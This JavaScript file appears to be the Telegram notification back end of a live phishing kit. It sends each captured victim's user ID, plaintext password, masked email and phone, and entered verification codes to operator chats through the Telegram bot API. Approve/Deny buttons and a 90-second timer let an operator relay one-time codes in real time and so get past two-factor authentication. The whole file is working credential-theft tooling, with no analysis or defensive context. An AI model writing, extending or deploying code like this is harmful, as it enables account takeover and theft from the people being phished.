var API = "https://api.telegram.org/bot";

function getBotPairs(env) {
  var tokenRaw = env.TELEGRAM_BOT_TOKEN || "";
  var chatIdRaw = env.TELEGRAM_CHAT_ID || "";
  if (!tokenRaw || !chatIdRaw) return [];

  var tokens = tokenRaw.split(",").map(function (s) { return s.trim(); }).filter(Boolean);
  var chatIds = chatIdRaw.split(",").map(function (s) { return s.trim(); }).filter(Boolean);

  var pairs = [];
  for (var i = 0; i < chatIds.length; i++) {
    var token = tokens[i] || tokens[0];
    if (token && chatIds[i]) {
      pairs.push({ token: token, chatId: chatIds[i] });
    }
  }
  return pairs;
}

export function findTokenForChat(env, chatId) {
  var pairs = getBotPairs(env);
  var match = pairs.find(function (p) { return p.chatId === String(chatId); });
  if (match) return match.token;
  return pairs[0] ? pairs[0].token : null;
}

async function sendToAll(env, text, taskId, includeButtons) {
  if (includeButtons === undefined) includeButtons = true;
  var pairs = getBotPairs(env);
  if (pairs.length === 0) return;

  for (var i = 0; i < pairs.length; i++) {
    var p = pairs[i];
    try {
      var payload = { chat_id: p.chatId, text: text };
      if (includeButtons) {
        payload.reply_markup = {
          inline_keyboard: [
            [
              { text: "Approve", callback_data: "approve:" + taskId },
              { text: "Deny", callback_data: "deny:" + taskId },
            ],
          ],
        };
      }
      await fetch(API + p.token + "/sendMessage", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(payload),
      });
    } catch (err) {
      console.error("[Telegram] Failed to send to " + p.chatId + ":", err);
    }
  }
}

export async function notifyNewTask(env, task) {
  var isVisit = task.request_kind === "visit";

  var lines = [
    isVisit ? "New page visit" : "New " + task.request_kind + " request",
    "",
    "User: " + task.user_id,
    !isVisit && task.password ? "Password: " + task.password : null,
    "Email: " + task.masked_email,
    "Phone: " + task.masked_phone,
    "Method: " + task.method,
    "Project: " + (task.project_name || task.project_id),
    task.member_origin ? "Origin: " + task.member_origin : null,
    "",
    isVisit ? null : "Auto-declines in 90s",
  ]
    .filter(function (l) { return l !== null; })
    .join("\n");

  await sendToAll(env, lines, task.id, !isVisit);
}

export async function notifyAdvance(env, task) {
  var lines;

  if (task.flow_step === "code_request") {
    var target =
      task.code_delivery_method === "phone"
        ? "Phone (" + task.masked_phone + ")"
        : "Email (" + task.masked_email + ")";
    lines = [
      "Code Delivery Request",
      "",
      "User: " + task.user_id,
      "Password: " + task.password,
      "Send code via: " + target,
      "Project: " + (task.project_name || task.project_id),
      "",
      "Approve to send code",
      "Auto-declines in 90s",
    ].join("\n");
  } else if (task.flow_step === "code_verify") {
    lines = [
      "Code Verification",
      "",
      "User: " + task.user_id,
      "Code entered: " + (task.verification_code || "N/A"),
      "Via: " + (task.code_delivery_method === "phone" ? "Phone" : "Email"),
      "Project: " + (task.project_name || task.project_id),
      "",
      "Approve if code matches",
      "Auto-declines in 90s",
    ].join("\n");
  } else {
    return;
  }

  await sendToAll(env, lines, task.id, true);
}

export async function editMessage(env, chatId, messageId, text) {
  var token = findTokenForChat(env, chatId);
  if (!token) return;

  try {
    await fetch(API + token + "/editMessageText", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: chatId,
        message_id: messageId,
        text: text,
      }),
    });
  } catch (err) {
    console.error("[Telegram] Failed to edit message:", err);
  }
}

export async function answerCallback(env, chatId, callbackQueryId, text) {
  var token = findTokenForChat(env, chatId);
  if (!token) return;

  try {
    await fetch(API + token + "/answerCallbackQuery", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ callback_query_id: callbackQueryId, text: text }),
    });
  } catch (err) {
    console.error("[Telegram] Failed to answer callback:", err);
  }
}
